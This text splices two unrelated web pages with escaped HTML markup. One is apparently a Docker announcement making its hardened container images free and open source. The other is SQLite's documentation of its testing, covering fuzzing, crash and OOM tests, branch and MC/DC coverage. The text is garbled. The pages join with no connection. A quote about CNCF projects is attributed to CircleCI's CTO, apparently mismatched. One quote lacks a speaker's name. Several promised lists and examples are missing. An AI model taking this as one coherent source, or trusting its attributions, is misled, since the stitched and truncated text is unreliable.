    &lt;p&gt;There’s more. We’ve already built Hardened Helm Charts to leverage DHI images in Kubernetes environments; those are open source too. And today, we’re expanding that foundation with Hardened MCP Servers. We’re bringing DHI’s security principles to the MCP interface layer, the backbone of every agentic app. And starting now, you can run hardened versions of the MCP servers developers rely on most: Mongo, Grafana, GitHub, and more. And this is just the beginning. In the coming months, we will extend this hardened foundation across the entire software stack with hardened libraries, hardened system packages, and other secure components everyone depends on. The goal is simple: be able to secure your application from &lt;code&gt;main()&lt;/code&gt; down. &lt;/p&gt;
    &lt;head rend="h2"&gt;&lt;lb/&gt;The philosophy of Docker Hardened Images&lt;/head&gt;
    &lt;p&gt;Base images define your application’s security from the very first layer, so it’s critical to know exactly what goes into them. Here’s how we approach it.&lt;/p&gt;
    &lt;p&gt;First: total transparency in every part of our minimal, opinionated, secure images.&lt;/p&gt;
    &lt;p&gt;DHI uses a distroless runtime to shrink the attack surface while keeping the tools developers rely on. But security is more than minimalism; it requires full transparency. Too many vendors blur the truth with proprietary CVE scoring, downgraded vulnerabilities, or vague promises about reaching SLSA Build Level 3.&lt;/p&gt;
    &lt;p&gt;DHI takes a different path. Every image includes a complete and verifiable SBOM. Every build provides SLSA Build Level 3 provenance. Every vulnerability is assessed using transparent public CVE data; we won’t hide vulnerabilities when we haven’t fixed them. Every image comes with proof of authenticity. The result: a secure foundation you can trust, built with clarity, verified with evidence, and delivered without compromise.&lt;/p&gt;
    &lt;p&gt;Second: Migrating to secure images takes real work, and no one should pretend otherwise. But as you’d expect from Docker, we’ve focused on making the DX incredibly easy to use. As we mentioned before, DHI is built on the open source foundations the world already trusts, Debian and Alpine, so teams can adopt it with minimal friction. We’re reducing that friction even more: Docker’s AI assistant can scan your existing containers and recommend or even apply equivalent hardened images; the feature is experimental as this is day one, but we’ll quickly GA it as we learn from real world migrations.&lt;/p&gt;
    &lt;p&gt;Lastly: we think about the most aggressive SLAs and longest support times and make certain that every piece of DHI can support that when you need it.&lt;/p&gt;
    &lt;p&gt;DHI Enterprise, the commercial offering of DHI, includes a 7-day commitment for critical CVE remediation, with a roadmap toward one day or less. For regulated industries and mission-critical systems, this level of trust is mandatory. Achieving it is hard. It demands deep test automation and the ability to maintain patches that diverge from upstream until they are accepted. That is why most organizations cannot do this on their own. In addition, DHI Enterprise allows organizations to easily customize DHI images, leveraging Docker’s build infrastructure which takes care of the full image lifecycle management for you, ensuring that build provenance and compliance is maintained. For example, typically organizations need to add certificates and keys, system packages, scripts, and so on. DHI’s build service makes this trivial.&lt;/p&gt;
    &lt;p&gt;Because our patching SLAs and our build service carry real operational cost, DHI has historically been one commercial offering. But our vision has always been broader. This level of security should be available to everyone, and the timing matters. Now that the evidence, infrastructure, and industry partnerships are in place, we are delivering on that vision. That is why today we are making Docker Hardened Images free and open source.&lt;/p&gt;
    &lt;p&gt;This move carries the same spirit that defined Docker Official Images over a decade ago. We made them free, kept them free, and backed them with clear docs, best practices, and consistent maintenance. That foundation became the starting point for millions of developers and partners.&lt;/p&gt;
    &lt;p&gt;Now we’re doing it again. DHI being free is powered by a rapidly growing ecosystem of partners, from Google, MongoDB, and the CNCF delivering hardened images to security platforms like Snyk and JFrog Xray integrating DHI directly into their scanners. Together, we are building a unified, end-to-end supply chain that raises the security bar for the entire industry.&lt;/p&gt;
    &lt;head rend="h4"&gt;“Docker’s move to make its hardened images freely available under Apache 2.0 underscores its strong commitment to the open source ecosystem. Many CNCF projects can already be found in the DHI catalog, and giving the broader community access to secure, well-maintained building blocks helps us strengthen the software supply chain together. It’s exciting to see Docker continue to invest in open collaboration and secure container infrastructure.”&lt;/head&gt;

    &lt;p&gt;Rob Zuber&lt;/p&gt;
    &lt;p&gt;Chief Technology Officer, CircleCI&lt;/p&gt;
    &lt;head rend="h4"&gt;“We evaluated multiple options for hardened base images and chose Docker Hardened Images (DHI) for its alignment with our supply chain security posture, developer tooling compatibility, Docker’s maturity in this space, and integration with our existing infrastructure. Our focus was on balancing trust, maintainability, and ecosystem compatibility.”&lt;/head&gt;
    &lt;p&gt;Vikram Sethi&lt;/p&gt;
    &lt;p&gt;Principal Scientist, Adobe&lt;/p&gt;
    &lt;head rend="h4"&gt;“Developers deserve secure foundations that do not slow them down. By making Docker Hardened Images freely available, Docker is making it easier than ever to secure the software supply chain at the source. This helps eliminate risk before anything touches production, a mission shared by LocalStack. At LocalStack, we are especially excited that developers will be able to use these hardened, minimal images for our emulators, helping teams finally break free from constant CVE firefighting.”&lt;/head&gt;

    &lt;p&gt;Co-Founder and CTO at LocalStack&lt;/p&gt;
    &lt;head rend="h2"&gt;A Secure Path for Every Team and Business&lt;/head&gt;
    &lt;p&gt;Everyone now has a secure foundation to start from with DHI. But businesses of all shapes and sizes often need more. Compliance requirements and risk tolerance may demand CVE patches ahead of upstream the moment the source becomes available. Companies operating in enterprise or government sectors must meet strict standards such as FIPS or STIG. And because production can never stop, many organizations need security patching to continue even after upstream support ends.&lt;/p&gt;
    &lt;p&gt;That is why we now offer three DHI options, each built for a different security reality.&lt;/p&gt;
    &lt;p&gt;Docker Hardened Images: Free for Everyone. DHI is the foundation modern software deserves: minimal hardened images, easy migration, full transparency, and an open ecosystem built on Alpine and Debian.&lt;/p&gt;
    &lt;p&gt;Docker Hardened Images (DHI) Enterprise: DHI Enterprise delivers the guarantees that organizations, governments, and institutions with strict security or regulatory demands rely on. FIPS-enabled and STIG-ready images. Compliance with CIS benchmarks. SLA-backed remediations they can trust for critical CVEs in under 7 days. And those SLAs keep getting shorter as we push toward one-day (or less) critical fixes.&lt;/p&gt;
    &lt;p&gt;For teams that need more control, DHI Enterprise delivers. Change your images. Configure runtimes. Install tools like curl. Add certificates. DHI Enterprise gives you unlimited customization, full catalog access, and the ability to shape your images on your terms while staying secure.&lt;/p&gt;
    &lt;p&gt;DHI Extended Lifecycle Support (ELS): ELS is a paid add-on to DHI Enterprise, built to solve one of software’s hardest problems. When upstream support ends, patches stop but vulnerabilities don’t. Scanners light up, auditors demand answers, and compliance frameworks expect verified fixes. ELS ends that cycle with up to five additional years of security coverage, continuous CVE patches, updated SBOMs and provenance, and ongoing signing and auditability for compliance.&lt;/p&gt;
    &lt;p&gt;You can learn more about these options here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Here’s how to get started&lt;/head&gt;
    &lt;p&gt;Securing the container ecosystem is something we do together. Today, we’re giving the world a stronger foundation to build on. Now we want every developer, every open source project, every software vendor, and every platform to make Docker Hardened Images the default.&lt;/p&gt;

    &lt;p&gt;Today’s announcement marks a watershed moment for our industry. Docker is fundamentally changing how applications are built-secure by default for every developer, every organization, and every open-source project.&lt;/p&gt;
    &lt;p&gt;This moment fills me with pride as it represents the culmination of years of work: from the early days at Atomist building an event-driven SBOM and vulnerability management system, the foundation that still underpins Docker Scout today, to unveiling DHI earlier this year, and now making it freely available to all. I am deeply grateful to my incredible colleagues and friends at Docker who made this vision a reality, and to our partners and customers who believed in us from day one and shaped this journey with their guidance and feedback.&lt;/p&gt;
    &lt;p&gt;Yet while this is an important milestone, it remains just that, a milestone. We are far from done, with many more innovations on the horizon. In fact, we are already working on what comes next.&lt;/p&gt;
    &lt;p&gt;Security is a team sport, and today Docker opened the field to everyone. Let’s play.&lt;/p&gt;
    &lt;head rend="h3"&gt;Michael Donovan&lt;/head&gt;
    &lt;p&gt;I joined Docker to positively impact as many developers as possible. This launch gives every developer the right to secure their applications without adding toil to their workload. It represents a monumental shift in the container ecosystem and the digital experiences we use every day.&lt;/p&gt;
    &lt;p&gt;I’m extremely proud of the product we’ve built and the customers we serve every day. I’ve had the time of my life building this with our stellar team and I’m more excited than ever for what’s to come next.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;The reliability and robustness of SQLite is achieved in part by thorough and careful testing.&lt;/p&gt;
    &lt;p&gt;As of version 3.42.0 (2023-05-16), the SQLite library consists of approximately 155.8 KSLOC of C code. (KSLOC means thousands of "Source Lines Of Code" or, in other words, lines of code excluding blank lines and comments.) By comparison, the project has 590 times as much test code and test scripts - 92053.1 KSLOC.&lt;/p&gt;
    &lt;p&gt;There are four independent test harnesses used for testing the core SQLite library. Each test harness is designed, maintained, and managed separately from the others.&lt;/p&gt;
    &lt;p&gt;The TCL Tests are the original tests for SQLite. They are contained in the same source tree as the SQLite core and like the SQLite core are in the public domain. The TCL tests are the primary tests used during development. The TCL tests are written using the TCL scripting language. The TCL test harness itself consists of 27.2 KSLOC of C code used to create the TCL interface. The test scripts are contained in 1390 files totaling 23.2MB in size. There are 51445 distinct test cases, but many of the test cases are parameterized and run multiple times (with different parameters) so that on a full test run millions of separate tests are performed.&lt;/p&gt;
    &lt;p&gt;The TH3 test harness is a set of proprietary tests, written in C that provide 100% branch test coverage (and 100% MC/DC test coverage) to the core SQLite library. The TH3 tests are designed to run on embedded and specialized platforms that would not easily support TCL or other workstation services. TH3 tests use only the published SQLite interfaces. TH3 consists of about 76.9 MB or 1055.4 KSLOC of C code implementing 50362 distinct test cases. TH3 tests are heavily parameterized, though, so a full-coverage test runs about 2.4 million different test instances. The cases that provide 100% branch test coverage constitute a subset of the total TH3 test suite. A soak test prior to release does about 248.5 million tests. Additional information on TH3 is available separately.&lt;/p&gt;
    &lt;p&gt;The SQL Logic Test or SLT test harness is used to run huge numbers of SQL statements against both SQLite and several other SQL database engines and verify that they all get the same answers. SLT currently compares SQLite against PostgreSQL, MySQL, Microsoft SQL Server, and Oracle 10g. SLT runs 7.2 million queries comprising 1.12GB of test data.&lt;/p&gt;
    &lt;p&gt;The dbsqlfuzz engine is a proprietary fuzz tester. Other fuzzers for SQLite mutate either the SQL inputs or the database file. Dbsqlfuzz mutates both the SQL and the database file at the same time, and is thus able to reach new error states. Dbsqlfuzz is built using the libFuzzer framework of LLVM with a custom mutator. There are 336 seed files. The dbsqlfuzz fuzzer runs about one billion test mutations per day. Dbsqlfuzz helps ensure that SQLite is robust against attack via malicious SQL or database inputs.&lt;/p&gt;
    &lt;p&gt;In addition to the four main test harnesses, there are many other small programs that implement specialized tests. Here are a few examples:&lt;/p&gt;
    &lt;p&gt;All of the tests above must run successfully, on multiple platforms and under multiple compile-time configurations, before each release of SQLite.&lt;/p&gt;
    &lt;p&gt;Prior to each check-in to the SQLite source tree, developers typically run a subset (called "veryquick") of the Tcl tests consisting of about 304.7 thousand test cases. The veryquick tests include most tests other than the anomaly, fuzz, and soak tests. The idea behind the veryquick tests are that they are sufficient to catch most errors, but also run in only a few minutes instead of a few hours.&lt;/p&gt;
    &lt;p&gt;Anomaly tests are tests designed to verify the correct behavior of SQLite when something goes wrong. It is (relatively) easy to build an SQL database engine that behaves correctly on well-formed inputs on a fully functional computer. It is more difficult to build a system that responds sanely to invalid inputs and continues to function following system malfunctions. The anomaly tests are designed to verify the latter behavior.&lt;/p&gt;
    &lt;p&gt;SQLite, like all SQL database engines, makes extensive use of malloc() (See the separate report on dynamic memory allocation in SQLite for additional detail.) On servers and workstations, malloc() never fails in practice and so correct handling of out-of-memory (OOM) errors is not particularly important. But on embedded devices, OOM errors are frighteningly common and since SQLite is frequently used on embedded devices, it is important that SQLite be able to gracefully handle OOM errors.&lt;/p&gt;
    &lt;p&gt;OOM testing is accomplished by simulating OOM errors. SQLite allows an application to substitute an alternative malloc() implementation using the sqlite3_config(SQLITE_CONFIG_MALLOC,...) interface. The TCL and TH3 test harnesses are both capable of inserting a modified version of malloc() that can be rigged to fail after a certain number of allocations. These instrumented mallocs can be set to fail only once and then start working again, or to continue failing after the first failure. OOM tests are done in a loop. On the first iteration of the loop, the instrumented malloc is rigged to fail on the first allocation. Then some SQLite operation is carried out and checks are done to make sure SQLite handled the OOM error correctly. Then the time-to-failure counter on the instrumented malloc is increased by one and the test is repeated. The loop continues until the entire operation runs to completion without ever encountering a simulated OOM failure. Tests like this are run twice, once with the instrumented malloc set to fail only once, and again with the instrumented malloc set to fail continuously after the first failure.&lt;/p&gt;
    &lt;p&gt;I/O error testing seeks to verify that SQLite responds sanely to failed I/O operations. I/O errors might result from a full disk drive, malfunctioning disk hardware, network outages when using a network file system, system configuration or permission changes that occur in the middle of an SQL operation, or other hardware or operating system malfunctions. Whatever the cause, it is important that SQLite be able to respond correctly to these errors and I/O error testing seeks to verify that it does.&lt;/p&gt;
    &lt;p&gt;I/O error testing is similar in concept to OOM testing; I/O errors are simulated and checks are made to verify that SQLite responds correctly to the simulated errors. I/O errors are simulated in both the TCL and TH3 test harnesses by inserting a new Virtual File System object that is specially rigged to simulate an I/O error after a set number of I/O operations. As with OOM error testing, the I/O error simulators can be set to fail just once, or to fail continuously after the first failure. Tests are run in a loop, slowly increasing the point of failure until the test case runs to completion without error. The loop is run twice, once with the I/O error simulator set to simulate only a single failure and a second time with it set to fail all I/O operations after the first failure.&lt;/p&gt;
    &lt;p&gt;In I/O error tests, after the I/O error simulation failure mechanism is disabled, the database is examined using PRAGMA integrity_check to make sure that the I/O error has not introduced database corruption.&lt;/p&gt;
    &lt;p&gt;Crash testing seeks to demonstrate that an SQLite database will not go corrupt if the application or operating system crashes or if there is a power failure in the middle of a database update. A separate white-paper titled Atomic Commit in SQLite describes the defensive measures SQLite takes to prevent database corruption following a crash. Crash tests strive to verify that those defensive measures are working correctly.&lt;/p&gt;
    &lt;p&gt;It is impractical to do crash testing using real power failures, of course, and so crash testing is done in simulation. An alternative Virtual File System is inserted that allows the test harness to simulate the state of the database file following a crash.&lt;/p&gt;
    &lt;p&gt;In the TCL test harness, the crash simulation is done in a separate process. The main testing process spawns a child process which runs some SQLite operation and randomly crashes somewhere in the middle of a write operation. A special VFS randomly reorders and corrupts the unsynchronized write operations to simulate the effect of buffered filesystems. After the child dies, the original test process opens and reads the test database and verifies that the changes attempted by the child either completed successfully or else were completely rolled back. The integrity_check PRAGMA is used to make sure no database corruption occurs.&lt;/p&gt;
    &lt;p&gt;The TH3 test harness needs to run on embedded systems that do not necessarily have the ability to spawn child processes, so it uses an in-memory VFS to simulate crashes. The in-memory VFS can be rigged to make a snapshot of the entire filesystem after a set number of I/O operations. Crash tests run in a loop. On each iteration of the loop, the point at which a snapshot is made is advanced until the SQLite operations being tested run to completion without ever hitting a snapshot. Within the loop, after the SQLite operation under test has completed, the filesystem is reverted to the snapshot and random file damage is introduced that is characteristic of the kinds of damage one expects to see following a power loss. Then the database is opened and checks are made to ensure that it is well-formed and that the transaction either ran to completion or was completely rolled back. The interior of the loop is repeated multiple times for each snapshot with different random damage each time.&lt;/p&gt;
    &lt;p&gt;The test suites for SQLite also explore the result of stacking multiple failures. For example, tests are run to ensure correct behavior when an I/O error or OOM fault occurs while trying to recover from a prior crash.&lt;/p&gt;
    &lt;p&gt;Fuzz testing seeks to establish that SQLite responds correctly to invalid, out-of-range, or malformed inputs.&lt;/p&gt;
    &lt;p&gt;SQL fuzz testing consists of creating syntactically correct yet wildly nonsensical SQL statements and feeding them to SQLite to see what it will do with them. Usually some kind of error is returned (such as "no such table"). Sometimes, purely by chance, the SQL statement also happens to be semantically correct. In that case, the resulting prepared statement is run to make sure it gives a reasonable result.&lt;/p&gt;
    &lt;p&gt;The concept of fuzz testing has been around for decades, but fuzz testing was not an effective way to find bugs until 2014 when Michal Zalewski invented the first practical profile-guided fuzzer, American Fuzzy Lop or "AFL". Unlike prior fuzzers that blindly generate random inputs, AFL instruments the program being tested (by modifying the assembly-language output from the C compiler) and uses that instrumentation to detect when an input causes the program to do something different - to follow a new control path or loop a different number of times. Inputs that provoke new behavior are retained and further mutated. In this way, AFL is able to "discover" new behaviors of the program under test, including behaviors that were never envisioned by the designers.&lt;/p&gt;
    &lt;p&gt;AFL proved adept at finding arcane bugs in SQLite. Most of the findings have been assert() statements where the conditional was false under obscure circumstances. But AFL has also found a fair number of crash bugs in SQLite, and even a few cases where SQLite computed incorrect results.&lt;/p&gt;
    &lt;p&gt;Because of its past success, AFL became a standard part of the testing strategy for SQLite beginning with version 3.8.10 (2015-05-07) until it was superseded by better fuzzers in version 3.29.0 (2019-07-10).&lt;/p&gt;
    &lt;p&gt;Beginning in 2016, a team of engineers at Google started the OSS Fuzz project. OSS Fuzz uses a AFL-style guided fuzzer running on Google's infrastructure. The Fuzzer automatically downloads the latest check-ins for participating projects, fuzzes them, and sends email to the developers reporting any problems. When a fix is checked in, the fuzzer automatically detects this and emails a confirmation to the developers.&lt;/p&gt;
    &lt;p&gt;SQLite is one of many open-source projects that OSS Fuzz tests. The test/ossfuzz.c source file in the SQLite repository is SQLite's interface to OSS fuzz.&lt;/p&gt;
    &lt;p&gt;OSS Fuzz no longer finds historical bugs in SQLite. But it is still running and does occasionally find issues in new development check-ins. Examples: [1] [2] [3].&lt;/p&gt;
    &lt;p&gt;Beginning in late 2018, SQLite has been fuzzed using a proprietary fuzzer called "dbsqlfuzz". Dbsqlfuzz is built using the libFuzzer framework of LLVM.&lt;/p&gt;
    &lt;p&gt;The dbsqlfuzz fuzzer mutates both the SQL input and the database file at the same time. Dbsqlfuzz uses a custom Structure-Aware Mutator on a specialized input file that defines both an input database and SQL text to be run against that database. Because it mutates both the input database and the input SQL at the same time, dbsqlfuzz has been able to find some obscure faults in SQLite that were missed by prior fuzzers that mutated only SQL inputs or only the database file. The SQLite developers keep dbsqlfuzz running against trunk in about 16 cores at all times. Each instance of dbsqlfuzz program is able to evalutes about 400 test cases per second, meaning that about 500 million cases are checked every day.&lt;/p&gt;
    &lt;p&gt;The dbsqlfuzz fuzzer has been very successful at hardening the SQLite code base against malicious attack. Since dbsqlfuzz has been added to the SQLite internal test suite, bug reports from external fuzzers such as OSSFuzz have all but stopped.&lt;/p&gt;
    &lt;p&gt;Note that dbsqlfuzz is not the Protobuf-based structure-aware fuzzer for SQLite that is used by Chromium and described in the Structure-Aware Mutator article. There is no connection between these two fuzzers, other than the fact that they are both based on libFuzzer The Protobuf fuzzer for SQLite is written and maintained by the Chromium team at Google, whereas dbsqlfuzz is written and maintained by the original SQLite developers. Having multiple independently-developed fuzzers for SQLite is good, as it means that obscure issues are more likely to be uncovered.&lt;/p&gt;
    &lt;p&gt;Near the end of January 2024, a second libFuzzer-based tool called "jfuzz" came into use. Jfuzz generates corrupt JSONB blobs and feeds them into the JSON SQL functions to verify that the JSON functions are able to safely and efficiently deal with corrupt binary inputs.&lt;/p&gt;
    &lt;p&gt;SQLite seems to be a popular target for third-parties to fuzz. The developers hear about many attempts to fuzz SQLite and they do occasionally get bug reports found by independent fuzzers. All such reports are promptly fixed, so the product is improved and that the entire SQLite user community benefits. This mechanism of having many independent testers is similar to Linus's law: "given enough eyeballs, all bugs are shallow".&lt;/p&gt;
    &lt;p&gt;One fuzzing researcher of particular note is Manuel Rigger. Most fuzzers only look for assertion faults, crashes, undefined behavior (UB), or other easily detected anomalies. Dr. Rigger's fuzzers, on the other hand, are able to find cases where SQLite computes an incorrect answer. Rigger has found many such cases. Most of these finds are obscure corner cases involving type conversions and affinity transformations, and a good number of the finds are against unreleased features. Nevertheless, his finds are still important as they are real bugs, and the SQLite developers are grateful to be able to identify and fix the underlying problems.&lt;/p&gt;
    &lt;p&gt;Historical test cases from AFL, OSS Fuzz, and dbsqlfuzz are collected in a set of database files in the main SQLite source tree and then rerun by the "fuzzcheck" utility program whenever one runs "make test". Fuzzcheck only runs a few thousand "interesting" cases out of the billions of cases that the various fuzzers have examined over the years. "Interesting" cases are cases that exhibit previously unseen behavior. Actual bugs found by fuzzers are always included among the interesting test cases, but most of the cases run by fuzzcheck were never actual bugs.&lt;/p&gt;
    &lt;p&gt;Fuzz testing and 100% MC/DC testing are in tension with one another. That is to say, code tested to 100% MC/DC will tend to be more vulnerable to problems found by fuzzing and code that performs well during fuzz testing will tend to have (much) less than 100% MC/DC. This is because MC/DC testing discourages defensive code with unreachable branches, but without defensive code, a fuzzer is more likely to find a path that causes problems. MC/DC testing seems to work well for building code that is robust during normal use, whereas fuzz testing is good for building code that is robust against malicious attack.&lt;/p&gt;
    &lt;p&gt;Of course, users would prefer code that is both robust in normal use and resistant to malicious attack. The SQLite developers are dedicated to providing that. The purpose of this section is merely to point out that doing both at the same time is difficult.&lt;/p&gt;
    &lt;p&gt;For much of its history SQLite has been focused on 100% MC/DC testing. Resistance to fuzzing attacks only became a concern with the introduction of AFL in 2014. For a while there, fuzzers were finding many problems in SQLite. In more recent years, the testing strategy of SQLite has evolved to place more emphasis on fuzz testing. We still maintain 100% MC/DC of the core SQLite code, but most testing CPU cycles are now devoted to fuzzing.&lt;/p&gt;
    &lt;p&gt;While fuzz testing and 100% MC/DC testing are in tension, they are not completely at cross-purposes. The fact that the SQlite test suite does test to 100% MC/DC means that when fuzzers do find problems, those problems can be fixed quickly and with little risk of introducing new errors.&lt;/p&gt;
    &lt;p&gt;There are numerous test cases that verify that SQLite is able to deal with malformed database files. These tests first build a well-formed database file, then add corruption by changing one or more bytes in the file by some means other than SQLite. Then SQLite is used to read the database. In some cases, the bytes changes are in the middle of data. This causes the content of the database to change while keeping the database well-formed. In other cases, unused bytes of the file are modified, which has no effect on the integrity of the database. The interesting cases are when bytes of the file that define database structure get changed. The malformed database tests verify that SQLite finds the file format errors and reports them using the SQLITE_CORRUPT return code without overflowing buffers, dereferencing NULL pointers, or performing other unwholesome actions.&lt;/p&gt;
    &lt;p&gt;The dbsqlfuzz fuzzer also does an excellent job of verifying that SQLite responds sanely to malformed database files.&lt;/p&gt;
    &lt;p&gt;SQLite defines certain limits on its operation, such as the maximum number of columns in a table, the maximum length of an SQL statement, or the maximum value of an integer. The TCL and TH3 test suites both contains numerous tests that push SQLite right to the edge of its defined limits and verify that it performs correctly for all allowed values. Additional tests go beyond the defined limits and verify that SQLite correctly returns errors. The source code contains testcase macros to verify that both sides of each boundary have been tested.&lt;/p&gt;
    &lt;p&gt;Whenever a bug is reported against SQLite, that bug is not considered fixed until new test cases that would exhibit the bug have been added to either the TCL or TH3 test suites. Over the years, this has resulted in thousands and thousands of new tests. These regression tests ensure that bugs that have been fixed in the past are not reintroduced into future versions of SQLite.&lt;/p&gt;
    &lt;p&gt;Resource leak occurs when system resources are allocated and never freed. The most troublesome resource leaks in many applications are memory leaks - when memory is allocated using malloc() but never released using free(). But other kinds of resources can also be leaked: file descriptors, threads, mutexes, etc.&lt;/p&gt;
    &lt;p&gt;Both the TCL and TH3 test harnesses automatically track system resources and report resource leaks on every test run. No special configuration or setup is required. The test harnesses are especially vigilant with regard to memory leaks. If a change causes a memory leak, the test harnesses will recognize this quickly. SQLite is designed to never leak memory, even after an exception such as an OOM error or disk I/O error. The test harnesses are zealous to enforce this.&lt;/p&gt;
    &lt;p&gt;The SQLite core, including the unix VFS, has 100% branch test coverage under TH3 in its default configuration as measured by gcov. Extensions such as FTS3 and RTree are excluded from this analysis.&lt;/p&gt;
    &lt;p&gt;There are many ways to measure test coverage. The most popular metric is "statement coverage". When you hear someone say that their program as "XX% test coverage" without further explanation, they usually mean statement coverage. Statement coverage measures what percentage of lines of code are executed at least once by the test suite.&lt;/p&gt;
    &lt;p&gt;Branch coverage is more rigorous than statement coverage. Branch coverage measures the number of machine-code branch instructions that are evaluated at least once on both directions.&lt;/p&gt;
    &lt;p&gt;To illustrate the difference between statement coverage and branch coverage, consider the following hypothetical line of C code:&lt;/p&gt;
    &lt;quote&gt;if( a&amp;gt;b &amp;amp;&amp;amp; c!=25 ){ d++; }&lt;/quote&gt;
    &lt;p&gt;Such a line of C code might generate a dozen separate machine code instructions. If any one of those instructions is ever evaluated, then we say that the statement has been tested. So, for example, it might be the case that the conditional expression is always false and the "d" variable is never incremented. Even so, statement coverage counts this line of code as having been tested.&lt;/p&gt;
    &lt;p&gt;Branch coverage is more strict. With branch coverage, each test and each subblock within the statement is considered separately. In order to achieve 100% branch coverage in the example above, there must be at least three test cases:&lt;/p&gt;
    &lt;p&gt;Any one of the above test cases would provide 100% statement coverage but all three are required for 100% branch coverage. Generally speaking, 100% branch coverage implies 100% statement coverage, but the converse is not true. To reemphasize, the TH3 test harness for SQLite provides the stronger form of test coverage - 100% branch test coverage.&lt;/p&gt;
    &lt;p&gt;A well-written C program will typically contain some defensive conditionals which in practice are always true or always false. This leads to a programming dilemma: Does one remove defensive code in order to obtain 100% branch coverage?&lt;/p&gt;
    &lt;p&gt;In SQLite, the answer to the previous question is "no". For testing purposes, the SQLite source code defines macros called ALWAYS() and NEVER(). The ALWAYS() macro surrounds conditions which are expected to always evaluate as true and NEVER() surrounds conditions that are always evaluated to false. These macros serve as comments to indicate that the conditions are defensive code. In release builds, these macros are pass-throughs:&lt;/p&gt;
    &lt;quote&gt;#define ALWAYS(X) (X) #define NEVER(X) (X)&lt;/quote&gt;
    &lt;p&gt;During most testing, however, these macros will throw an assertion fault if their argument does not have the expected truth value. This alerts the developers quickly to incorrect design assumptions.&lt;/p&gt;
    &lt;quote&gt;#define ALWAYS(X) ((X)?1:assert(0),0) #define NEVER(X) ((X)?assert(0),1:0)&lt;/quote&gt;
    &lt;p&gt;When measuring test coverage, these macros are defined to be constant truth values so that they do not generate assembly language branch instructions, and hence do not come into play when calculating the branch coverage:&lt;/p&gt;
    &lt;quote&gt;#define ALWAYS(X) (1) #define NEVER(X) (0)&lt;/quote&gt;
    &lt;p&gt;The test suite is designed to be run three times, once for each of the ALWAYS() and NEVER() definitions shown above. All three test runs should yield exactly the same result. There is a run-time test using the sqlite3_test_control(SQLITE_TESTCTRL_ALWAYS, ...) interface that can be used to verify that the macros are correctly set to the first form (the pass-through form) for deployment.&lt;/p&gt;
    &lt;p&gt;Another macro used in conjunction with test coverage measurement is the testcase() macro. The argument is a condition for which we want test cases that evaluate to both true and false. In non-coverage builds (that is to say, in release builds) the testcase() macro is a no-op:&lt;/p&gt;
    &lt;quote&gt;#define testcase(X)&lt;/quote&gt;
    &lt;p&gt;But in a coverage measuring build, the testcase() macro generates code that evaluates the conditional expression in its argument. Then during analysis, a check is made to ensure tests exist that evaluate the conditional to both true and false. Testcase() macros are used, for example, to help verify that boundary values are tested. For example:&lt;/p&gt;
    &lt;quote&gt;testcase( a==b ); testcase( a==b+1 ); if( a&amp;gt;b &amp;amp;&amp;amp; c!=25 ){ d++; }&lt;/quote&gt;
    &lt;p&gt;Testcase macros are also used when two or more cases of a switch statement go to the same block of code, to make sure that the code was reached for all cases:&lt;/p&gt;
    &lt;quote&gt;switch( op ){ case OP_Add: case OP_Subtract: { testcase( op==OP_Add ); testcase( op==OP_Subtract ); /* ... */ break; } /* ... */ }&lt;/quote&gt;
    &lt;p&gt;For bitmask tests, testcase() macros are used to verify that every bit of the bitmask affects the outcome. For example, in the following block of code, the condition is true if the mask contains either of two bits indicating either a MAIN_DB or a TEMP_DB is being opened. The testcase() macros that precede the if statement verify that both cases are tested:&lt;/p&gt;
    &lt;quote&gt;testcase( mask &amp;amp; SQLITE_OPEN_MAIN_DB ); testcase( mask &amp;amp; SQLITE_OPEN_TEMP_DB ); if( (mask &amp;amp; (SQLITE_OPEN_MAIN_DB|SQLITE_OPEN_TEMP_DB))!=0 ){ ... }&lt;/quote&gt;
    &lt;p&gt;The SQLite source code contains 1184 uses of the testcase() macro.&lt;/p&gt;
    &lt;p&gt;Two methods of measuring test coverage were described above: "statement" and "branch" coverage. There are many other test coverage metrics besides these two. Another popular metric is "Modified Condition/Decision Coverage" or MC/DC. Wikipedia defines MC/DC as follows:&lt;/p&gt;
    &lt;p&gt;In the C programming language where &amp;amp;&amp;amp; and || are "short-circuit" operators, MC/DC and branch coverage are very nearly the same thing. The primary difference is in boolean vector tests. One can test for any of several bits in bit-vector and still obtain 100% branch test coverage even though the second element of MC/DC - the requirement that each condition in a decision take on every possible outcome - might not be satisfied.&lt;/p&gt;
    &lt;p&gt;SQLite uses testcase() macros as described in the previous subsection to make sure that every condition in a bit-vector decision takes on every possible outcome. In this way, SQLite also achieves 100% MC/DC in addition to 100% branch coverage.&lt;/p&gt;
    &lt;p&gt;Branch coverage in SQLite is currently measured using gcov with the "-b" option. First the test program is compiled using options "-g -fprofile-arcs -ftest-coverage" and then the test program is run. Then "gcov -b" is run to generate a coverage report. The coverage report is verbose and inconvenient to read, so the gcov-generated report is processed using some simple scripts to put it into a more human-friendly format. This entire process is automated using scripts, of course.&lt;/p&gt;
    &lt;p&gt;Note that running SQLite with gcov is not a test of SQLite — it is a test of the test suite. The gcov run does not test SQLite because the -fprofile-args and -ftest-coverage options cause the compiler to generate different code. The gcov run merely verifies that the test suite provides 100% branch test coverage. The gcov run is a test of the test - a meta-test.&lt;/p&gt;
    &lt;p&gt;After gcov has been run to verify 100% branch test coverage, then the test program is recompiled using delivery compiler options (without the special -fprofile-arcs and -ftest-coverage options) and the test program is rerun. This second run is the actual test of SQLite.&lt;/p&gt;
    &lt;p&gt;It is important to verify that the gcov test run and the second real test run both give the same output. Any differences in output indicate either the use of undefined or indeterminate behavior in the SQLite code (and hence a bug), or a bug in the compiler. Note that SQLite has, over the previous decade, encountered bugs in each of GCC, Clang, and MSVC. Compiler bugs, while rare, do happen, which is why it is so important to test the code in an as-delivered configuration.&lt;/p&gt;
    &lt;p&gt;Using gcov (or similar) to show that every branch instruction is taken at least once in both directions is a good measure of test suite quality. But even better is showing that every branch instruction makes a difference in the output. In other words, we want to show not only that every branch instruction both jumps and falls through but also that every branch is doing useful work and that the test suite is able to detect and verify that work. When a branch is found that does not make a difference in the output, that suggests that code associated with the branch can be removed (reducing the size of the library and perhaps making it run faster) or that the test suite is inadequately testing the feature that the branch implements.&lt;/p&gt;
    &lt;p&gt;SQLite strives to verify that every branch instruction makes a difference using mutation testing. A script first compiles the SQLite source code into assembly language (using, for example, the -S option to gcc). Then the script steps through the generated assembly language and, one by one, changes each branch instruction into either an unconditional jump or a no-op, compiles the result, and verifies that the test suite catches the mutation.&lt;/p&gt;
